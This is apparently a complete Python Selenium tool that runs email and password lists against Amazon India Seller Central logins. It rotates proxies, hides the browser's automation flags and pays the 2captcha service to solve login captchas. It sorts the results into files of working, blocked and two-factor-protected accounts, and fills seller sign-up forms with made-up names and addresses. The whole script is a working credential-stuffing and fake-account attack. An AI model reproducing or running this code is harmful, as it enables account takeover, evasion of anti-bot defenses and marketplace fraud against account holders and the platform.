import names, os, random, string, phonenumbers, warnings
from captcha_solver import CaptchaSolver
from selenium.webdriver import Keys
clear = lambda: os.system('cls')
clear()
import urllib.request
from glob import iglob
from PIL import Image
from threading import Thread
from colorama import Fore
from selenium import webdriver
from selenium.webdriver.common.by import By
from time import sleep
import random_address
from selenium.webdriver.support.select import Select
from selenium.webdriver.support.wait import WebDriverWait
import phone_iso3166.country as countries
clear()
warnings.filterwarnings("ignore", category=DeprecationWarning)
global url1
url1="https://sellercentral.amazon.in/ap/signin?openid.return_to=https%3A%2F%2Fsellercentral.amazon.in%2Fsw%2Fin%2FINSSR%2Fstep%2FSignUp%3Fpassthrough%252Faccount%3Dsoa%26passthrough%252FmarketplaceID%3DA21TJRUUN4KGV%26passthrough%252FsuperSource%3DOAR%26ref_%3Dscin_soa_wp_rp_h%26language%3Den_IN%26passthrough%252Flanguage%3Den_IN%26passthrough%252FinitialSessionID%3D260-5059162-6500656%26passthrough%252Fld%3DNSGoogle_SCINRP_WP_H%26productTier%3DSILVER%26productType%3DSellOnAmazon%26marketplaceId%3DA21TJRUUN4KGV%26redirectAP%3D1&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=amzn_sw_signup_in&openid.mode=checkid_setup&marketPlaceId=A21TJRUUN4KGV&language=en_IN&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&ssoResponse=eyJ6aXAiOiJERUYiLCJlbmMiOiJBMjU2R0NNIiwiYWxnIjoiQTI1NktXIn0.vwAshHFamDnC3RnywdziBXS-2c1Y5LdbE3mM45851CdhsZBMGtNYFQ.BPmRUSwcnLxuH0Hh.SohAU4sisYeifTfZ4j-QCuOpJUYiYCBsMA_FeJEB_nM5xMEaw5cRHQ3eLkiCOx04ugIUfbAxEAuYASQnsRKS29xICuVHm-PvzMM1ZtQns4vsqY7SVMs8RXfH55vdpmRxEaUxxmWFJlrR4f_fAzQO6eMHR28ypmvk2E3vjikAaCZlMrW5ohK_sIptt6cagptWrol3SSiGrM2YwQCJErSmhTEC33De-tuQhz6b41QuZfnwiNcsKw1Lo_nihaEL.-bnG2S_qnWxsHOeqcrgXxg"

def get_driver():
    chrome_options = webdriver.ChromeOptions()
    # chrome_options = uc.ChromeOptions()
    with open('vpn.txt', 'r') as e:
        proxy = e.readline()
        e.close()
    with open('vpn.txt', 'r') as e:
        data = e.read().splitlines(True)
        e.close()
    with open('vpn.txt', 'w') as e:
        e.writelines(data[1:])
        e.close()
    with open('vpn.txt', 'a') as e:
        e.write(proxy)
        e.close()
    chrome_options.add_argument('--proxy-server=%s' % proxy)
    print(Fore.RED + 'proxy : ' + Fore.GREEN + proxy)
    # chrome_options.experimental_options["prefs"] = {
    #     "profile.managed_default_content_settings.images": 2,
    #     "profile.managed_default_content_settings.stylesheets": 2,
    #     # "profile.managed_default_content_settings.javascript": 2,
    #     "profile.managed_default_content_settings.geolocation": 2,
    #     "profile.default_content_setting_values.notifications": 2,
    # }
    if headless==0:
        chrome_options.add_argument("--headless")
    # chrome_options.add_extension('so.crx')
    # chrome_options = uc.ChromeOptions()
    chrome_options.add_argument("--lang=en-US")
    chrome_options.add_argument("--disable-gpu")
    chrome_options.add_argument("--mute-audio")
    chrome_options.add_argument("disable-infobars")
    chrome_options.add_argument("--clear-token-service")
    chrome_options.add_argument('--disable-popup-blocking')
    chrome_options.add_argument("--aggressive-cache-discard")
    chrome_options.add_argument("--disable-cache")
    chrome_options.add_argument("--disable-application-cache")
    chrome_options.add_argument("--disable-offline-load-stale-cache")
    chrome_options.add_argument("--disable-3d-apis")
    chrome_options.add_argument("--disable-gpu-shader-disk-cache")
    chrome_options.add_argument("--media-cache-size=0")
    chrome_options.add_argument("--disk-cache-size=0")
    chrome_options.add_argument("--disable-blink-features=AutomationControlled")
    chrome_options.add_argument('--disable-gpu')
    chrome_options.add_argument('--disable-dev-shm-usage')
    # chrome_options.add_argument('--blink-settings=imagesEnabled=false')
    # chrome_options.add_argument("--user-agent= Mozilla/5.0 (iPhone; CPU iPhone OS 14_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/87.0.4280.77 Mobile/15E148 Safari/604.1")
    chrome_options.add_argument("--disable-extensions")
    chrome_options.add_argument("--incognito")
    chrome_options.add_argument("--window-size=700,700")
    chrome_options.add_argument("--log-level=3")
    chrome_options.add_experimental_option('excludeSwitches', ['enable-logging'])
    chrome_options.add_argument("--silent")
    chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
    chrome_options.add_experimental_option('useAutomationExtension', False)
    driver = webdriver.Chrome('chromedriver.exe', options=chrome_options)
    # driver = uc.Chrome(options=chrome_options)
    driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
    driver.delete_all_cookies()
    return driver

def readEmail():
    with open('Emails.txt', 'r') as e:
        EmailData = e.readline()
        e.close()
    with open('Emails.txt', 'r') as e:
        data = e.read().splitlines(True)
        e.close()
    with open('Emails.txt', 'w') as e:
        e.writelines(data[1:])
        e.close()
    # with open('positions/positionEmails.txt', 'r') as e:
    #     position= e.readline()
    #     e.close()
    # with open('Emails.txt', 'r') as e:
    #     e.seek(int(position))
    #     EmailData = e.readline()
    #     if EmailData=="" or EmailData==" " :
    #         position=0
    #     else:
    #         position = e.tell()
    # with open('positions/positionEmails.txt', 'w') as e:
    #     e.write(str(position))
    #     e.close()
    return EmailData

def StartLogin(driver, EmailData):
    try:
        Email, Pass = str(EmailData).split('|')
        print(Fore.BLUE+"[=] Start Withe >>> "+Email+Fore.RESET)
        driver.get(url1)
        # WebDriverWait(driver, 100).until(EC.presence_of_all_elements_located)
        if "Type the characters you see in this image" in driver.page_source:
            letters = string.ascii_lowercase
            result_str = ''.join(random.choice(letters) for i in range(13))
            with open(f"trash/{result_str}.png", "ab") as file:
                f = 0
                while f == 0:
                    try:
                        captcha_img = WebDriverWait(driver, 100).until(
                            lambda driver: driver.find_element(By.CSS_SELECTOR, "div.a-row.a-text-center > img"))
                        file.write(captcha_img.screenshot_as_png)
                        f = 1
                    except:
                        f = 0
            with open("captcha code.txt", "r") as c:
                cap = c.readline()
                solver = CaptchaSolver('2captcha', api_key=f'{cap}')
                raw_data = open(f"trash/{result_str}.png", 'rb').read()
            solving_captcha = solver.solve_captcha(raw_data)
            WebDriverWait(driver, 100).until(
                lambda driver: driver.find_element("id", "captchacharacters")).send_keys(
                solving_captcha)
            sleep(0.1)
            WebDriverWait(driver, 100).until(
                lambda driver: driver.find_element(By.CSS_SELECTOR, value="span > button")).click()
            sleep(0.1)
            os.remove(f'trash/{result_str}.png')

        if 'ap_password' in driver.page_source:
            WebDriverWait(driver, 20).until(lambda driver: driver.find_element(by=By.NAME, value='email')).send_keys(
                Email)
            WebDriverWait(driver, 20).until(lambda driver: driver.find_element(by=By.NAME, value='password')).send_keys(
                Pass, Keys.RETURN)

        else:
            WebDriverWait(driver, 20).until(lambda driver: driver.find_element(by=By.NAME, value='email')).send_keys(
                Email, Keys.RETURN)
            WebDriverWait(driver, 20).until(lambda driver: driver.find_element(by=By.NAME, value='password')).send_keys(
                Pass, Keys.RETURN)
        sleep(0.3)
        if "auth-warning-message-box" in driver.page_source:
            WebDriverWait(driver, 20).until(
                lambda driver: driver.find_element(by=By.NAME, value='password')).clear()
            WebDriverWait(driver, 20).until(
                lambda driver: driver.find_element(by=By.NAME, value='password')).send_keys(
                Pass)
            letters = string.ascii_lowercase
            result_str = ''.join(random.choice(letters) for i in range(15))
            srccaptchavalue = WebDriverWait(driver, 100).until(
                lambda driver: driver.find_element(By.CSS_SELECTOR, "#auth-captcha-image")).get_attribute("src")
            if ('.gif' in srccaptchavalue):
                urllib.request.urlretrieve(srccaptchavalue, "trash/%s.gif" % (result_str))
                frame = Image.open(f'trash/{result_str}.gif')
                nframes = 0
                rep = 0
                numoffile = 1
                while frame:
                    if nframes == 0 or nframes == rep + 7 and nframes < 42:
                        frame.save(f'trash/{result_str}-%s.png' % (numoffile), 'PNG')
                        inf = f'trash/{result_str}-%s.png' % (numoffile)
                        im = Image.open(inf)
                        crop_rectangle = (im.width - 40, 0, im.width, im.height)
                        cropped_im = im.crop(crop_rectangle)
                        cropped_im.save('%s' % inf, 'PNG')
                        numoffile += 1
                        rep = nframes
                    nframes += 1
                    try:
                        frame.seek(nframes)
                    except EOFError:
                        break
                ins = 1
                new_im = Image.new('RGB', (40 * 6, 70), (250, 250, 250))
                numoffile = 1
                for fn in sorted(iglob(f'trash/{result_str}-%s.png' % (numoffile))):
                    img = Image.open(fn)
                    if ins == 1:
                        new_im.paste(img, (0, 0))
                    if ins == 2:
                        new_im.paste(img, (40, 0))
                    if ins == 3:
                        new_im.paste(img, (40 * 2, 0))
                    if ins == 4:
                        new_im.paste(img, (40 * 3, 0))
                    if ins == 5:
                        new_im.paste(img, (40 * 4, 0))
                    if ins == 6:
                        new_im.paste(img, (40 * 5, 0))
                    ins += 1
                numoffile = 2
                for fn in sorted(iglob(f'trash/{result_str}-%s.png' % (numoffile))):
                    img = Image.open(fn)
                    if ins == 1:
                        new_im.paste(img, (0, 0))
                    if ins == 2:
                        new_im.paste(img, (40, 0))
                    if ins == 3:
                        new_im.paste(img, (40 * 2, 0))
                    if ins == 4:
                        new_im.paste(img, (40 * 3, 0))
                    if ins == 5:
                        new_im.paste(img, (40 * 4, 0))
                    if ins == 6:
                        new_im.paste(img, (40 * 5, 0))
                    ins += 1
                numoffile = 3
                for fn in sorted(iglob(f'trash/{result_str}-%s.png' % (numoffile))):
                    img = Image.open(fn)
                    if ins == 1:
                        new_im.paste(img, (0, 0))
                    if ins == 2:
                        new_im.paste(img, (40, 0))
                    if ins == 3:
                        new_im.paste(img, (40 * 2, 0))
                    if ins == 4:
                        new_im.paste(img, (40 * 3, 0))
                    if ins == 5:
                        new_im.paste(img, (40 * 4, 0))
                    if ins == 6:
                        new_im.paste(img, (40 * 5, 0))
                    ins += 1
                numoffile = 4
                for fn in sorted(iglob(f'trash/{result_str}-%s.png' % (numoffile))):
                    img = Image.open(fn)
                    if ins == 1:
                        new_im.paste(img, (0, 0))
                    if ins == 2:
                        new_im.paste(img, (40, 0))
                    if ins == 3:
                        new_im.paste(img, (40 * 2, 0))
                    if ins == 4:
                        new_im.paste(img, (40 * 3, 0))
                    if ins == 5:
                        new_im.paste(img, (40 * 4, 0))
                    if ins == 6:
                        new_im.paste(img, (40 * 5, 0))
                    ins += 1
                numoffile = 5
                for fn in sorted(iglob(f'trash/{result_str}-%s.png' % (numoffile))):
                    img = Image.open(fn)
                    if ins == 1:
                        new_im.paste(img, (0, 0))
                    if ins == 2:
                        new_im.paste(img, (40, 0))
                    if ins == 3:
                        new_im.paste(img, (40 * 2, 0))
                    if ins == 4:
                        new_im.paste(img, (40 * 3, 0))
                    if ins == 5:
                        new_im.paste(img, (40 * 4, 0))
                    if ins == 6:
                        new_im.paste(img, (40 * 5, 0))
                    ins += 1
                numoffile = 6
                for fn in sorted(iglob(f'trash/{result_str}-%s.png' % (numoffile))):
                    img = Image.open(fn)
                    if ins == 1:
                        new_im.paste(img, (0, 0))
                    if ins == 2:
                        new_im.paste(img, (40, 0))
                    if ins == 3:
                        new_im.paste(img, (40 * 2, 0))
                    if ins == 4:
                        new_im.paste(img, (40 * 3, 0))
                    if ins == 5:
                        new_im.paste(img, (40 * 4, 0))
                    if ins == 6:
                        new_im.paste(img, (40 * 5, 0))
                    ins += 1
                new_im.save(f'trash/{result_str}.jpg', "JPEG", quality=80, optimize=True, progressive=True)
                with open("captcha code.txt", "r") as c:
                    cap = c.readline()
                    solver = CaptchaSolver('2captcha', api_key=f'{cap}')
                    raw_data = open(f"trash/{result_str}.jpg", 'rb').read()

                solving_captcha = solver.solve_captcha(raw_data)
                # print(solving_captcha+"   11111111111111111111111111111111111")
                # WebDriverWait(driver, 50).until(EC.presence_of_element_located(
                #     (By.XPATH, '//*[@id="cvf-page-content"]/div/div/div/form/div[2]/div/input'))).send_keys(
                #     solving_captcha[0:6], Keys.RETURN)
                try:
                    WebDriverWait(driver, 100).until(
                        lambda driver: driver.find_element("id", "auth-captcha-guess")).send_keys(
                        solving_captcha)
                    sleep(0.1)
                    WebDriverWait(driver, 100).until(lambda driver: driver.find_element("id", "signInSubmit")).click()
                    # WebDriverWait(driver, 50).until(EC.presence_of_element_located(
                    #     (By.XPATH, '/html/body/div[1]/div[1]/div[2]/div/div[2]/div/div/form/div/div/div/div[3]/div[1]/input'))).send_keys(
                    #     solving_captcha[0:6], Keys.RETURN)
                except:
                    print(2222222222222)
                sleep(0.5)
            else:
                letters = string.ascii_lowercase
                result_str = ''.join(random.choice(letters) for i in range(8))
                WebDriverWait(driver, 20).until(
                    lambda driver: driver.find_element(by=By.NAME, value='password')).clear()
                WebDriverWait(driver, 20).until(
                    lambda driver: driver.find_element(by=By.NAME, value='password')).send_keys(
                    Pass)
                with open(f"trash/{result_str}.png", "ab") as file:
                    captcha_img = WebDriverWait(driver, 100).until(
                        lambda driver: driver.find_element(By.CSS_SELECTOR, "#auth-captcha-image"))
                    file.write(captcha_img.screenshot_as_png)
                with open("captcha code.txt", "r") as c:
                    cap = c.readline()
                    solver = CaptchaSolver('2captcha', api_key=f'{cap}')
                    raw_data = open(f"trash/{result_str}.png", 'rb').read()
                solving_captcha = solver.solve_captcha(raw_data)
                WebDriverWait(driver, 100).until(
                    lambda driver: driver.find_element("id", "auth-captcha-guess")).send_keys(
                    solving_captcha)
                sleep(0.1)
                WebDriverWait(driver, 100).until(lambda driver: driver.find_element("id", "signInSubmit")).click()
                sleep(0.2)
                os.remove(f'trash/{result_str}.png')
            sleep(0.3)
        if "auth-error-message-box" in driver.page_source or "forgotpassword/reverification?" in driver.current_url:
            if "Enter the characters as they are given in the challenge" in driver.page_source:
                print(
                    Fore.LIGHTRED_EX + "[!] error captcha" + Fore.RESET)
                with open("error captcha.txt", 'a') as f:
                    f.write(Email + "|" + Pass)
                driver.quit()
            else:
                print(
                    Fore.LIGHTRED_EX + "[!] Invalid Login, Check Your Email or Password or maybe Account Blocked!" + Fore.RESET)
                with open("AccountBlocked.txt", 'a') as f:
                    f.write(Email + "|" + Pass)
                driver.quit()
        sleep(0.3)
        try:
            driver.find_element(By.XPATH,
                                "/html/body/div[1]/div[1]/div[2]/div/div[2]/div/div/div/form/div/div[5]/div/a").click()
        except:
            pass

        if "Type the characters you see in this image" in driver.page_source:
            letters = string.ascii_lowercase
            result_str = ''.join(random.choice(letters) for i in range(3))
            with open(f"trash/{result_str}.png", "ab") as file:
                f = 0
                while f == 0:
                    try:
                        captcha_img = WebDriverWait(driver, 100).until(
                            lambda driver: driver.find_element(By.CSS_SELECTOR, "div.a-row.a-text-center > img"))
                        file.write(captcha_img.screenshot_as_png)
                        f = 1
                    except:
                        f = 0
            with open("captcha code.txt", "r") as c:
                cap = c.readline()
                solver = CaptchaSolver('2captcha', api_key=f'{cap}')
                raw_data = open(f"trash/{result_str}.png", 'rb').read()
            solving_captcha = solver.solve_captcha(raw_data)
            WebDriverWait(driver, 100).until(
                lambda driver: driver.find_element("id", "captchacharacters")).send_keys(
                solving_captcha)
            sleep(0.1)
            WebDriverWait(driver, 100).until(
                lambda driver: driver.find_element(By.CSS_SELECTOR, value="span > button")).click()
            sleep(0.1)
            os.remove(f'trash/{result_str}.png')

        if "For your security, approve the notification sent to:" in driver.page_source :
            with open("sellerCenter.txt",'a') as f :
                 f.write(Email+"|"+Pass)
            print(Fore.YELLOW + " seller Center " + Email + Fore.RESET)
            driver.quit()

        else:

            if "Enable Two-Step Verification" in driver.page_source :
                with open('SuccessEmailIN.txt', 'a') as f:
                    f.write(Email + "|" + Pass)
                print(Fore.GREEN + "[=] Success Email >>> " + Email + Fore.RESET)
                driver.quit()
            else:
                # FIRST STEP
                try:
                    lol = 0
                    WebDriverWait(driver, 5).until(lambda driver: driver.find_element( by=By.NAME,value='ln_legal_name')).send_keys(names.get_full_name())
                    # WebDriverWait(driver, 5).until(lambda driver: driver.find_element( by=By.NAME,value='ln_legal_name')).send_keys(names.get_full_name())
                    WebDriverWait(driver, 5).until(lambda driver: driver.find_element( by=By.CSS_SELECTOR,value='div.a-section.a-spacing-top-micro > div > label > i')).click()
                    # sleep(999)

                    WebDriverWait(driver, 5).until(lambda driver: driver.find_element( by=By.CSS_SELECTOR,value='#a-autoid-1 > span > input')).click()
                    lol=1
                except:
                    pass
                # SECOUND STEP
                try:
                    # if lol==1:
                    while "Enter your business address" not in driver.page_source:
                            sleep(1)
                    # else:
                    #     WebDriverWait(driver, 2).until(
                    #         lambda driver: driver.find_element(by=By.NAME, value='displayNameField'))

                    # WebDriverWait(driver, 12).until(lambda driver: driver.find_element(by=By.CSS_SELECTOR,value='fieldset > div:nth-child(1) > label')).click()
                    sleep(0.5)
                    chare = 'ASDFGJNBMUHkljbsakvnasluv'
                    ss=""
                    for i in range(10):
                        ss += random.choice(chare)
                    WebDriverWait(driver, 5).until(lambda driver: driver.find_element(by=By.NAME, value='displayNameField')).send_keys(names.get_first_name()+" "+ss)

                    index = random.randint(2, 20)
                    sleep(0.5)

                    # print (index)
                    select = Select(driver.find_element(By.ID, 'primaryCategoryDropdown'))
                    select.select_by_index(index)
                    sleep(0.5)

                    WebDriverWait(driver, 5).until(lambda driver: driver.find_element(by=By.NAME, value='displayNameField')).click()
                    sleep(0.5)

                    lines = open("PinCode.txt",'r').read().splitlines()
                    pincode,st=str(random.choice(lines)).split('|')
                    WebDriverWait(driver, 5).until(lambda driver: driver.find_element(by=By.NAME, value='pincode')).send_keys(pincode)
                    sleep(0.5)

                    element=WebDriverWait(driver, 5).until(lambda driver: driver.find_element(by=By.NAME, value='city'))
                    # driver.execute_script("arguments[0].scrollIntoView();", element)
                    element.click()
                    while True:
                        try:
                            WebDriverWait(driver, 5).until(
                                lambda driver: driver.find_element(by=By.NAME, value='address_line1')).send_keys(st)
                            sleep(1)
                            break
                        except:
                            pass


                    # driver.execute_script("window.scrollBy(0,500)")
                    while True:
                        try:
                            element = WebDriverWait(driver, 5).until(
                                lambda driver: driver.find_element(by=By.ID, value='a-autoid-2-announce'))
                            driver.execute_script("arguments[0].scrollIntoView();", element)
                            element.click()
                            break
                        except:
                            pass
                except:
                    pass
                sleep(2)
                # sleep(999)
                # THIRD STEP
                try:

                    driver.execute_script("window.scrollBy(0,500)")
                    while True:
                        try:
                            WebDriverWait(driver, 5).until(lambda driver: driver.find_element(by=By.CSS_SELECTOR,
                                                                                              value='div:nth-child(2) > div > div > div > div.a-section.cls-shipping-method-radio-container > div > label')).click()
                            sleep(0.5)
                            break
                        except:
                            pass

                    # sleep(999)

                    WebDriverWait(driver, 5).until(lambda driver: driver.find_element(by=By.XPATH, value='//*[@id="id_SaveShippingMethodButton"]/span/input')).click()
                    while "Enable Two-Step Verification" not in  driver.page_source:
                        sleep(1)

                    driver.quit()
                except:
                    try:
                        driver.quit()
                    except:
                        pass
                with open('SuccessEmailIN.txt', 'a') as f:
                    f.write(Email + "|" + Pass)
                print(Fore.GREEN + "[=] Success Email >>> " + Email + Fore.RESET)
    except:
        try:
            driver.quit()
        except:
            pass
def main():
    while True:
        # try:
            driver = get_driver()
            EmailData = readEmail()
            StartLogin(driver, EmailData)
        # except:
        #     pass
def cls(): os.system('cls' if os.name == 'nt' else 'clear')
def logo():
    cls()
    print(Fore.WHITE+'''
                                        
                            ────────────────────────────────────────────────────────────
                            ─██████──████████────████████████████──────██████████████───
                            ─██░░██──██░░░░██────██░░░░░░░░░░░░██──────██░░░░░░░░░░██───
                            ─██░░██──██░░████────██░░████████░░██──────██░░██████░░██───
                            ─██░░██──██░░██──────██░░██────██░░██──────██░░██──██░░██───
                            ─██░░██████░░██──────██░░████████░░██──────██░░██████░░████─
                            ─██░░░░░░░░░░██──────██░░░░░░░░░░░░██──────██░░░░░░░░░░░░██─
                            ─██░░██████░░██──────██░░██████░░████──────██░░████████░░██─
                            ─██░░██──██░░██──────██░░██──██░░██────────██░░██────██░░██─
                            ─██░░██──██░░████────██░░██──██░░██████────██░░████████░░██─
                            ─██░░██──██░░░░██────██░░██──██░░░░░░██────██░░░░░░░░░░░░██─
                            ─██████──████████────██████──██████████────████████████████─
                            ────────────────────────────────────────────────────────────
    \n\n\n''')

if __name__ == '__main__':
    logo()
    # This code won't run if this file is imported.
    print("[+] pleas enter number of threads..")
    number_of_threads = input()
    # print("[+] if you need change language enter >> 1 ")
    # try:
    #     AskLang= int(input())
    # except:
    #     AskLang=0
    print("[+] to non headless enter >> 1 ")
    try:
        headless=int(input())
    except:
        headless=0

    def func():
        main()
    for number in range(int(number_of_threads)):
        t = Thread(target=func)
        t.start()
        sleep(1)

